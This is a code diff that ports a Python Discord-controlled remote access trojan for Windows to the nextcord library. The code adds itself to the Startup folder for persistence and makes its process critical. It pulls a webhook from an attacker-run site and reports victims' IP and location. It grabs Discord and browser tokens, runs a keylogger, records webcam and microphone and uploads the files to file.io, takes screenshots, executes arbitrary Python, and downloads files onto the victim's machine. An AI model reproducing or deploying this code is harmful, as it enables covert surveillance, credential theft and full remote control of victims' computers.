@@ -1,35 +1,173 @@
-import discord 
-import json 
-import subprocess 
-import asyncio
-import ctypes 
-import os 
-import threading 
-import requests 
-import time 
-import cv2 
-import win32clipboard
-import win32process
-import win32con
-import win32gui
-import winreg
-import re
-import sys
-import shutil
-import pyautogui
-from urllib.request import urlopen, urlretrieve
-from time import sleep
-from mss import mss
-from comtypes import CLSCTX_ALL
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+#import
+#----------------------------------------------------
+import nextcord
+from nextcord import Interaction
+from nextcord.ext import commands
+from discord_webhook import DiscordWebhook
+
+import requests
+import os
 import base64
-from discord_components import *
-from discord.ext import commands
-from discord_slash.context import ComponentContext
-from discord_slash import SlashContext, SlashCommand
-from discord_slash.model import ButtonStyle
-from discord_slash.utils.manage_components import create_button, create_actionrow, create_select, create_select_option, wait_for_component
-from discord import Webhook, RequestsWebhookAdapter
+import win32clipboard
+import sys
+import winreg
+import shutil
+from time import sleep
+import time
+import win32gui
+import json
+from urllib.request import urlopen, urlretrieve
+import subprocess
+import ctypes
+import threading
+import re
+import cv2
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from comtypes import CLSCTX_ALL
+import asyncio
+#----------------------------------------------------
+from sys import executable
+exename = executable.split('\\')
+exename = (exename[-1])
+subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\Programs\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+
+
+
+
+weblink = "https://yourlink.000webhostapp.com"
+
+
+
+#def
+#----------------------------------------------------
+def critproc():
+    import ctypes
+    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
+    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
+
+def uncritproc():
+    import ctypes
+    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
+
+def MaxVolume():
+    devices = AudioUtilities.GetSpeakers()
+    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
+    if volume.GetMute() == 1:
+        volume.SetMute(0, None)
+    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
+
+def MuteVolume():
+    devices = AudioUtilities.GetSpeakers()
+    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
+    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
+
+def between_callback(client):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(activity(client))
+    loop.close()
+
+def change_res(cap, width, height):
+    cap.set(3, width)
+    cap.set(4, height)
+
+def get_dims(cap, res='1080p'):
+    STD_DIMENSIONS =  {
+        "480p": (640, 480),
+        "720p": (1280, 720),
+        "1080p": (1920, 1080),
+        "4k": (3840, 2160),
+    }
+    width, height = STD_DIMENSIONS["480p"]
+    if res in STD_DIMENSIONS:
+        width,height = STD_DIMENSIONS[res]
+    change_res(cap, width, height)
+    return width, height
+
+
+
+# https://www.youtube.com/watch?v=gdUZeuhPBy8
+
+
+class rExit(nextcord.ui.View):
+    def _init_(self):
+        super()._init_()
+        self.value = None
+    @nextcord.ui.button(label = "Yes", style=nextcord.ButtonStyle.green)
+    async def yesExit(self, button: nextcord.ui.Button, interaction: Interaction):
+        await interaction.response.send_message('exit program', ephemeral=False)
+        os._exit(0)
+    @nextcord.ui.button(label = "No", style=nextcord.ButtonStyle.red)
+    async def noExit(self, button: nextcord.ui.Button, interaction: Interaction):
+        await interaction.response.send_message('cancelled exit', ephemeral=False)
+        self.value = False
+        self.stop()
+
+
+def msgbox(message, type):
+    return ctypes.windll.user32.MessageBoxW(0, message, "Attention!", type | 0x1000)
+class rMsgBox(nextcord.ui.View):
+    def _init_(self):
+        super()._init_()
+        self.value = None
+    @nextcord.ui.button(label = "Error", style=nextcord.ButtonStyle.green)
+    async def msgerror(self, button: nextcord.ui.Button, interaction: Interaction):
+            threading.Thread(target=msgbox, args=(varMessageBox, 16)).start()
+    @nextcord.ui.button(label = "Warning", style=nextcord.ButtonStyle.green)
+    async def msgwarning(self, button: nextcord.ui.Button, interaction: Interaction):
+        threading.Thread(target=msgbox, args=(varMessageBox, 48)).start()
+    @nextcord.ui.button(label = "Info", style=nextcord.ButtonStyle.green)
+    async def msginfo(self, button: nextcord.ui.Button, interaction: Interaction):
+        threading.Thread(target=msgbox, args=(varMessageBox, 64)).start()
+    @nextcord.ui.button(label = "Question", style=nextcord.ButtonStyle.green)
+    async def msgquestion(self, button: nextcord.ui.Button, interaction: Interaction):
+        threading.Thread(target=msgbox, args=(varMessageBox, 32)).start()
+
+
+
+
+
+class rWrite(nextcord.ui.View):
+    def _init_(self):
+        super()._init_()
+        self.value = None
+    
+    @nextcord.ui.button(label = "Yes", style=nextcord.ButtonStyle.green)
+    async def yeswrite(self, button: nextcord.ui.Button, interaction: Interaction):
+        await interaction.response.send_message('enter True', ephemeral=False)
+        global pressEnter
+        pressEnter = True
+        self.value = False
+        self.stop()
+    @nextcord.ui.button(label = "No", style=nextcord.ButtonStyle.red)
+    async def nowrite(self, button: nextcord.ui.Button, interaction: Interaction):
+        await interaction.response.send_message('cancelled enter', ephemeral=False)
+        global pressEnter
+        pressEnter = False
+        self.value = False
+        self.stop()
+
+
+
+#----------------------------------------------------
+#----------------------------------------------------
+#----------------------------------------------------
+
+#var
+#----------------------------------------------------
+intents = nextcord.Intents.all()
+intents.message_content = True
+client = commands.Bot(command_prefix="!", intents=intents)
+#----------------------------------------------------
+#----------------------------------------------------
+#----------------------------------------------------
+
+#start
+#----------------------------------------------------
+
 def ping(host):
     import platform
     # Option for the number of packets as a function of
@@ -69,14 +207,6 @@ with urlopen("http://ipinfo.io/json") as url:
     ip = data['ip']
     country = data['country']
     city = data['city']
-
-
-
-weblink = "your 000webhost link"
-
-
-    
-
 status = False
 while status == False:
     wificheck()
@@ -85,7 +215,7 @@ while status == False:
         try:
             global webhook
             webhooklink = base64.b64decode(requests.get(weblink+"/private/webhook").text.rstrip()).decode("utf-8")
-            webhook = Webhook.from_url(webhooklink, adapter=RequestsWebhookAdapter())
+            webhook = (webhooklink)
             status = True
             webhookMode = True  
         except:
@@ -100,7 +230,7 @@ def destruct():
             destruct = (requests.get(weblink+"/private/desctruct").text.rstrip()).decode("utf-8")
             if destruct == "goodbye":
                 if webhookMode:
-                    webhook.send(f"```desctruct mode is on {ip} has destroyed```")
+                    DiscordWebhook(url=webhook,content=f"```desctruct mode is on {ip} has destroyed```").execute()
                 import inspect
                 import os
                 import inspect
@@ -122,8 +252,6 @@ def destruct():
         time.sleep(60)
 tdestruct = threading.Thread(target=destruct)
 
-client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Discord RAT to shits on pc\'s')
-slash = SlashCommand(client, sync_commands=True)
 def get_token():
     status = False
     while status == False:
@@ -134,7 +262,7 @@ def get_token():
         except:
             if webhookMode == True:
                 try:
-                    webhook.send(f"{os.getlogin()} | {ip} | {country} | {city} || have an error with the token please solve it here {weblink}/public")
+                    DiscordWebhook(url=webhook,content=f"{os.getlogin()} | {ip} | {country} | {city} || have an error with the token please solve it here {weblink}/public").execute()
                 except:
                     pass
             time.sleep(60)
@@ -154,7 +282,7 @@ def get_gild():
         except:
             if webhookMode == True:
                 try:
-                    webhook.send(f"{os.getlogin()} | {ip} | {country} | {city} || have an error with the server gild please solve it here {weblink}/public")
+                    DiscordWebhook(url=(webhook), content=(f"{os.getlogin()} | {ip} | {country} | {city} || have an error with the server gild please solve it here {weblink}/public")).execute()
                 except:
                     pass            
             time.sleep(60)
@@ -172,33 +300,9 @@ while status == False:
     else:
         time.sleep(60)
 
-is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-from sys import executable
-exename = executable.split('\\')
-exename = (exename[-1])
-subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\Programs\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-#subprocess.run(f'start "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\Programs\Startup\{exename}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
-
-def critproc():
-    import ctypes
-    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
-    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
-
-def uncritproc():
-    import ctypes
-    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
-
-@client.event
-async def on_slash_command_error(ctx, error):
-    if isinstance(error, discord.ext.commands.errors.MissingPermissions):
-        await ctx.send('You do not have permission to execute this command')
-    else:
-        print(error)
-
 @client.event
 async def on_command_error(cmd, error):
-    if isinstance(error, discord.ext.commands.errors.CommandNotFound):
+    if isinstance(error, nextcord.ext.commands.errors.CommandNotFound):
         pass
 global stop_threads
 async def activity(client):
@@ -206,27 +310,28 @@ async def activity(client):
         if stop_threads:
             break
         window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-        await client.change_presence(status=discord.Status.online, activity=discord.Game(f"Visiting: {window}"))
+        await client.change_presence(status=nextcord.Status.online, activity=nextcord.Game(f"Visiting: {window}"))
         sleep(1)
 
 @client.event
 async def on_ready():
+    print("caca")
     global channel_name
-    DiscordComponents(client)
     number = 0
 
     process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
     wtype = process2.communicate()[0].decode().strip("Caption\n").strip()
-
+    global l
+    l = []
     for x in client.get_all_channels():
-        (on_ready.total).append(x.name)
-    for y in range(len(on_ready.total)):
-        if "session" in on_ready.total[y]:
-            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
+        l.append(x.name)
+    for y in range(len(l)):
+        if "session" in l[y]:
+            result = [e for e in re.split("[^0-9]", l[y]) if e != '']
             biggest = max(map(int, result))
             number = biggest + 1
         else:
-            pass  
+            pass
 
     if number == 0:
         channel_name = "session-1"
@@ -234,8 +339,9 @@ async def on_ready():
     else:
         channel_name = f"session-{number}"
         await client.guilds[0].create_text_channel(channel_name)
+
         
-    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
+    channel_ = nextcord.utils.get(client.get_all_channels(), name=channel_name)
     channel = client.get_channel(channel_.id)
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
     value1 = f"@here ✔ New session, opened **{channel_name}** | **{wtype}** | **{ip}, {country}/{city}**\n> Succesfully gained access to user **`{os.getlogin()}`**"
@@ -243,57 +349,47 @@ async def on_ready():
         await channel.send(f'{value1} with **`admin`** perms')
     elif is_admin == False:
         await channel.send(value1)
-    game = discord.Game(f"Window logging stopped")
-    await client.change_presence(status=discord.Status.online, activity=game)
-
-on_ready.total = []
-
-def between_callback(client):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(activity(client))
-    loop.close()
-
-def MaxVolume():
-    devices = AudioUtilities.GetSpeakers()
-    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
-    if volume.GetMute() == 1:
-        volume.SetMute(0, None)
-    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
-
-def MuteVolume():
-    devices = AudioUtilities.GetSpeakers()
-    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
-    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
+    game = nextcord.Game(f"Window logging stopped")
+    await client.change_presence(status=nextcord.Status.online, activity=game)
+#----------------------------------------------------
 
 
 
-global stop_threads
 
-@slash.slash(name="stopngrok", description="stop ngrok", guild_ids=g)
-async def stopngrok_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+
+
+#commands
+#----------------------------------------------------
+
+@client.slash_command(name="test", description="kill sessions", guild_ids=g)
+async def test_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+        pass
+
+
+@client.slash_command(name="stopngrok", description="stop ngrok", guild_ids=g)
+async def stopngrok_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             global ngrokMode
+            global ngrok_tunnel
             ngrokMode = False
             ngrok_tunnel = "ngrok has stoped"
-            await ctx.send("ngrok stoped")
+            await interaction.channel.send("ngrok stoped")
 
 
-@slash.slash(name="ngroklink", description="send ngrok link", guild_ids=g)
-async def ngroklink_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="ngroklink", description="send ngrok link", guild_ids=g)
+async def ngroklink_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             try:
-                await ctx.send(f"link {ngrok_tunnel}")
+                await interaction.channel.send(f"link {ngrok_tunnel}")
             except:
-                await ctx.send("there is no link")
+                await interaction.channel.send("there is no link")
 
 
 
-@slash.slash(name="camshot", description="dump key loggs", guild_ids=g)
-async def dumpkeylog_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="camshot", description="take a camera image", guild_ids=g)
+async def dumpkeylog_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
                 import os
                 import time
                 import cv2
@@ -304,41 +400,41 @@ async def dumpkeylog_command(ctx: SlashContext):
                 return_value, image = camera.read()
                 cv2.imwrite(temp + r"\temp.png", image)
                 del(camera)
-                file = discord.File(temp + r"\temp.png", filename="temp.png")
-                await ctx.send("[*] Command successfuly executed", file=file)
+                file = nextcord.File(temp + r"\temp.png", filename="temp.png")
+                await interaction.channel.send("[*] Command successfuly executed", file=file)
 
 
-@slash.slash(name="winstop", description="winstart stop windows logg", guild_ids=g)
-async def winstop_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="winstop", description="winstart stop windows logg", guild_ids=g)
+async def winstop_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             global stop_threads
             stop_threads = True
-            await ctx.send("Window logging for this session stopped")
-            game = discord.Game(f"Window logging stopped")
-            await client.change_presence(status=discord.Status.online, activity=game)  
+            await interaction.channel.send("Window logging for this session stopped")
+            game = nextcord.Game(f"Window logging stopped")
+            await client.change_presence(status=nextcord.Status.online, activity=game)  
 
 
-@slash.slash(name="winstart", description="winstart start windows logg", guild_ids=g)
-async def winstart_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="winstart", description="winstart start windows logg", guild_ids=g)
+async def winstart_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             global stop_threads
             stop_threads = False
             threading.Thread(target=between_callback, args=(client,)).start()
-            await ctx.send("Window logging for this session started")
+            await interaction.channel.send("Window logging for this session started")
 
 
 
-@slash.slash(name="discordtoken", description="send discord tokens", guild_ids=g)
-async def discordtoken_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-                await ctx.send(f"extracting tokens...")
+@client.slash_command(name="discordtoken", description="send nextcord tokens", guild_ids=g)
+async def nextcordtoken_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+                await interaction.channel.send(f"extracting tokens...")
                 tokens = []
                 saved = ""
                 paths = {
-                    'Discord': os.getenv('APPDATA') + r'\\discord\\Local Storage\\leveldb\\',
-                    'Discord Canary': os.getenv('APPDATA') + r'\\discordcanary\\Local Storage\\leveldb\\',
+                    'nextcord': os.getenv('APPDATA') + r'\\nextcord\\Local Storage\\leveldb\\',
+                    'nextcord Canary': os.getenv('APPDATA') + r'\\nextcordcanary\\Local Storage\\leveldb\\',
                     'Lightcord': os.getenv('APPDATA') + r'\\Lightcord\\Local Storage\\leveldb\\',
-                    'Discord PTB': os.getenv('APPDATA') + r'\\discordptb\\Local Storage\\leveldb\\',
+                    'nextcord PTB': os.getenv('APPDATA') + r'\\nextcordptb\\Local Storage\\leveldb\\',
                     'Opera': os.getenv('APPDATA') + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                     'Opera GX': os.getenv('APPDATA') + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                     'Amigo': os.getenv('LOCALAPPDATA') + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
@@ -369,7 +465,7 @@ async def discordtoken_command(ctx: SlashContext):
                                 for token in re.findall(regex, line):
                                     tokens.append(token)
                 for token in tokens:
-                    r = requests.get("https://discord.com/api/v9/users/@me", headers={
+                    r = requests.get("https://nextcord.com/api/v9/users/@me", headers={
                         "Content-Type": "application/json",
                         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                         "Authorization": token
@@ -379,34 +475,48 @@ async def discordtoken_command(ctx: SlashContext):
                             continue
                         saved += f"`{token}`\n\n"
                 if saved != "":
-                    await ctx.send(f"**Token(s) succesfully grabbed:** \n{saved}")
+                    await interaction.channel.send(f"**Token(s) succesfully grabbed:** \n{saved}")
                 else:
-                    await ctx.send(f"**User didn't have any stored tokens**")
+                    await interaction.channel.send(f"**User didn't have any stored tokens**")
 
 
+@client.slash_command(name="threads", description="threads", guild_ids=g)
+async def threads_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+        for thread in threading.enumerate(): 
+            await interaction.channel.send(thread.name)
 
+@client.slash_command(name="killthread", description="threads", guild_ids=g)
+async def killthread_command(interaction: Interaction, thread:str):
+    if interaction.channel.name == channel_name:
+        try:
+            thread.terminate()
+        except:
+            pass
 
-@slash.slash(name="deletekeylog", description="delete key loggs", guild_ids=g)
-async def deletekeylog_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="deletekeylog", description="delete key loggs", guild_ids=g)
+async def deletekeylog_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             keyLogFile = (os.getenv("TEMP") + "/key_log.txt")
             (os.remove(keyLogFile))
-            await ctx.send("deleted")
+            await interaction.channel.send("deleted")
 
 
 
-@slash.slash(name="dumpkeylog", description="dump key loggs", guild_ids=g)
-async def dumpkeylog_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="dumpkeylog", description="dump key loggs", guild_ids=g)
+async def dumpkeylog_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+        try:
                 file_keys = os.path.join(os.getenv("TEMP") + "/key_log.txt")
-                file = discord.File(file_keys, filename=file_keys)
-                await ctx.send("Successfully dumped all the logs", file=file)
+                file = nextcord.File(file_keys, filename=file_keys)
+                await interaction.channel.send("Successfully dumped all the logs", file=file)
                 os.remove(file_keys)
+        except Exception as e:
+            await interaction.channel.send(e)
 
-
-@slash.slash(name="startkeylog", description="start key logger", guild_ids=g)
-async def startkeylog_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="startkeylog", description="start key logger", guild_ids=g)
+async def startkeylog_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
         import os
         from pynput.keyboard import Key, Listener
         import logging
@@ -428,51 +538,34 @@ async def startkeylog_command(ctx: SlashContext):
         test._running = True
         test.daemon = True
         test.start()
-        await ctx.send("Keylogger Started!")
+        await interaction.channel.send("Keylogger Started!")
 
-@slash.slash(name="exit", description="exit program", guild_ids=g)
-async def exit_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-                buttons = [
-                        create_button(
-                            style=ButtonStyle.green,
-                            label="✔"
-                        ),
-                        create_button(
-                            style=ButtonStyle.red,
-                            label="X"
-                        ),
-                    ]
-                action_row = create_actionrow(*buttons)
-                await ctx.send("Are you sure you want to exit the program on your victims pc?", components=[action_row])
-
-                res = await client.wait_for('button_click')
-                if res.component.label == "✔":
-                    await ctx.send(content="Exited the program!", hidden=True)
-                    os._exit(0)
-                else:
-                    await ctx.send(content="Cancelled the exit", hidden=True)
+@client.slash_command(name="exit", description="exit program", guild_ids=g)
+async def exit_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+        view = rExit()
+        await interaction.response.send_message("exit program?", view=view)
+        await view.wait()      
 
 
 
 
-@slash.slash(name="kill", description="kill sessions", guild_ids=g)
-async def kill_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-            for y in range(len(on_ready.total)): 
-                if "session" in on_ready.total[y]:
-                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
+@client.slash_command(name="kill", description="kill sessions", guild_ids=g)
+async def kill_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+            for y in range(len(l)): 
+                if "session" in l[y]:
+                    channel_to_delete = nextcord.utils.get(client.get_all_channels(), name=l[y])
                     await channel_to_delete.delete()
                 else:
                     pass
-            await ctx.send(f"Killed all the inactive sessions")
 
 
 
 
-@slash.slash(name="info", description="general info", guild_ids=g)
-async def info_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="info", description="general info", guild_ids=g)
+async def info_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             try:
                 url = 'http://ipinfo.io/json'
                 response = urlopen(url)
@@ -485,8 +578,8 @@ async def info_command(ctx: SlashContext):
                 wtype = process2.communicate()[0].decode().strip("Caption\n").strip()
 
                 userdata = f"```fix\n------- {os.getlogin()} -------\nComputername: {os.getenv('COMPUTERNAME')}\nIP: {data['ip']}\nUsing VPN?: {UsingVPN}\nOrg: {data['org']}\nCity: {data['city']}\nRegion: {data['region']}\nPostal: {data['postal']}\nWindowskey: {wkey}\nWindows Type: {wtype}\n```**Map location: {googlemap}**\n"
-                await ctx.send(userdata)
-            except:await ctx.send("error trying to get info") 
+                await interaction.channel.send(userdata)
+            except:await interaction.channel.send("error trying to get info") 
 
 
 
@@ -504,22 +597,22 @@ class MyBrowser(wx.Dialog):
 
 
 
-@slash.slash(name="webwindow", description="open a web withow the url in a window", guild_ids=g)
-async def webwindow_command(ctx: SlashContext, url: str):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="webwindow", description="open a web withow the url in a window", guild_ids=g)
+async def webwindow_command(interaction: Interaction, url: str):
+    if interaction.channel.name == channel_name:
         if url.startswith("http://") or url.startswith("https://"):
             try:
-                ctx.send("web window started")
+                await interaction.channel.send("web window started")
                 app = wx.App() 
                 dialog = MyBrowser(None, -1)
                 dialog.browser.LoadURL(url) 
                 dialog.Show() 
                 app.MainLoop()
             except Exception as e:
-                ctx.send("```try other link```")
-                ctx.send(e)
+                await interaction.channel.send("```try other link```")
+                await interaction.channel.send(e)
         else:
-            ctx.send("you need to put https:// or http://")
+            await interaction.channel.send("you need to put https:// or http://")
 
 
 
@@ -529,27 +622,10 @@ async def webwindow_command(ctx: SlashContext, url: str):
 
 
 
-def change_res(cap, width, height):
-    cap.set(3, width)
-    cap.set(4, height)
 
-def get_dims(cap, res='1080p'):
-    STD_DIMENSIONS =  {
-        "480p": (640, 480),
-        "720p": (1280, 720),
-        "1080p": (1920, 1080),
-        "4k": (3840, 2160),
-    }
-    width, height = STD_DIMENSIONS["480p"]
-    if res in STD_DIMENSIONS:
-        width,height = STD_DIMENSIONS[res]
-    change_res(cap, width, height)
-    return width, height
-
-
-@slash.slash(name="python", description="takes a video of their webcam", guild_ids=g)
-async def python_command(ctx: SlashContext, script: str):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="python", description="takes a video of their webcam", guild_ids=g)
+async def python_command(interaction: Interaction, script: str):
+    if interaction.channel.name == channel_name:
             from io import StringIO
             import sys, os
             import traceback
@@ -560,28 +636,28 @@ async def python_command(ctx: SlashContext, script: str):
             old_stderr = sys.stderr
             sys.stderr = new_stderr
             if os.path.exists(script):
-                await ctx.send("[*] Running python file...")
+                await interaction.channel.send("[*] Running python file...")
                 with open(script, 'r') as f:
                     python_code = f.read()
                     try:
                         exec(python_code)
                     except Exception as exc:
-                        await ctx.send(traceback.format_exc())
+                        await interaction.channel.send(f"```Python Error: \n\n{traceback.format_exc()}```")
             else:
-                await ctx.send("[*] Running python command...")
+                await interaction.channel.send("[*] Running python command...")
                 try:
                     exec(script)
                 except Exception as exc:
-                    await ctx.send(traceback.format_exc())
+                    await interaction.channel.send(f"```Python Error: \n\n{traceback.format_exc()}```")
             sys.stdout = old_stdout
             sys.stderr = old_stderr
-            await ctx.send(new_stdout.getvalue() + new_stderr.getvalue())
+            await interaction.channel.send(f"```Python Output: \n{new_stdout.getvalue()}{new_stderr.getvalue()}```")
 
 
-@slash.slash(name="webcam", description="takes a video of their webcam", guild_ids=g)
-async def webcam_command(ctx: SlashContext, secons: int):
-    if ctx.channel.name == channel_name:
-        await ctx.send("Taking video of webcam. . .")
+@client.slash_command(name="webcam", description="takes a video of their webcam", guild_ids=g)
+async def webcam_command(interaction: Interaction, secons: int):
+    if interaction.channel.name == channel_name:
+        await interaction.channel.send("Taking video of webcam. . .")
         temp = os.path.join(f"{os.getenv('TEMP')}\\videoo.mp4")
         res = '720p'
         t_end = time.time() + secons
@@ -596,16 +672,16 @@ async def webcam_command(ctx: SlashContext, secons: int):
             out.release()
             cv2.destroyAllWindows()
         else:
-            await ctx.send(f"**{os.getlogin()}'s** has no webcam :/")
+            await interaction.channel.send(f"**{os.getlogin()}'s** has no webcam :/")
         import requests
         response = requests.post('https://file.io/', files={"file": open(temp, "rb")}).json()["link"]
-        await ctx.send(f"download link: " + response)
+        await interaction.channel.send(f"download link: " + response)
 
 
 
-@slash.slash(name="recmic", description="takes a record of their mic", guild_ids=g)
-async def recmic_command(ctx: SlashContext, secons: int):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="recmic", description="takes a record of their mic", guild_ids=g)
+async def recmic_command(interaction: Interaction, secons: int):
+    if interaction.channel.name == channel_name:
             import pyaudio
             import wave
             CHUNK = 1024 
@@ -624,7 +700,7 @@ async def recmic_command(ctx: SlashContext, secons: int):
                             input=True,
                             frames_per_buffer=CHUNK) #buffer
 
-            await ctx.send("* recording")
+            await interaction.channel.send("* recording")
 
             frames = []
 
@@ -649,38 +725,39 @@ async def recmic_command(ctx: SlashContext, secons: int):
 
             import requests
             response = requests.post('https://file.io/', files={"file": open(temp+"\\audioo.wav", "rb")}).json()["link"]
-            await ctx.send(f"download link: " + response)
+            await interaction.channel.send(f"download link: " + response)
 
 
 
-@slash.slash(name="screenshot", description="take a screenshot", guild_ids=g)
-async def screenshot_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="screenshot", description="take a screenshot", guild_ids=g)
+async def screenshot_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+        import mss
         temp = os.path.join(os.getenv('TEMP') + "\\monitor.png")
-        with mss() as sct:
+        with mss.mss() as sct:
             sct.shot(output=temp)
-        file = discord.File(temp, filename="monitor.png")
-        await ctx.send("Screenshot taken!", file=file)
+        file = nextcord.File(temp, filename="monitor.png")
+        await interaction.channel.send("Screenshot taken!", file=file)
         os.remove(temp)
 
 
-@slash.slash(name="MaxVolume", description="set their sound to max", guild_ids=g)
-async def MaxVolume_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="maxvolume", description="set their sound to max", guild_ids=g)
+async def maxvolume_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
         MaxVolume()
-        await ctx.send("Volume set to **100%**")
+        await interaction.channel.send("Volume set to **100%**")
 
 
-@slash.slash(name="MuteVolume", description="set their sound to 0", guild_ids=g)
-async def MuteVolume_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="mutevolume", description="set their sound to 0", guild_ids=g)
+async def mutevolume_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
         MuteVolume()
-        await ctx.send("Volume set to **0%**")
+        await interaction.channel.send("Volume set to **0%**")
 
 
-@slash.slash(name="Wallpaper", description="Change their wallpaper", guild_ids=g)
-async def Wallpaper_command(ctx: SlashContext, link: str):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="wallpaper", description="Change their wallpaper", guild_ids=g)
+async def wallpaper_command(interaction: Interaction, link: str):
+    if interaction.channel.name == channel_name:
         if re.match(r'^(?:http|ftp)s?://', link) is not None:
             image_formats = ("image/png", "image/jpeg", "image/jpg", "image/x-icon",)
             r = requests.head(link)
@@ -688,42 +765,42 @@ async def Wallpaper_command(ctx: SlashContext, link: str):
                 path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
                 urlretrieve(link, path)
                 ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
-                await ctx.send(f"Successfully Changed their wallpaper to:\n{link}")
+                await interaction.channel.send(f"Successfully Changed their wallpaper to:\n{link}")
             else:
-                await ctx.send("Link needs to be a url to an image!")
+                await interaction.channel.send("Link needs to be a url to an image!")
         else:
-            await ctx.send("Invalid link!")
+            await interaction.channel.send("Invalid link!")
 
 
-@slash.slash(name="upload", description="upload a file", guild_ids=g)
-async def upload_command(ctx: SlashContext, url: str,filename: str,file_path: str):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="upload", description="upload a file", guild_ids=g)
+async def upload_command(interaction: Interaction, url: str,filename: str,file_path: str):
+    if interaction.channel.name == channel_name:
             from datetime import datetime
             if '"' in file_path:
                 file_path = file_path.replace('"','')
             try: 
                 os.chdir(file_path)
             except: 
-                return await ctx.followup.send("Invalid directory!")
+                return await interaction.channel.send("Invalid directory!")
             
             try:
                 r = requests.get(url, allow_redirects=True)
             except:
-                return await ctx.followup.send("Invalid URL!")
+                return await interaction.channel.send("Invalid URL!")
 
             with open(filename, "wb") as f: 
                 f.write(r.content)
                 
-            await ctx.send(
+            await interaction.channel.send(
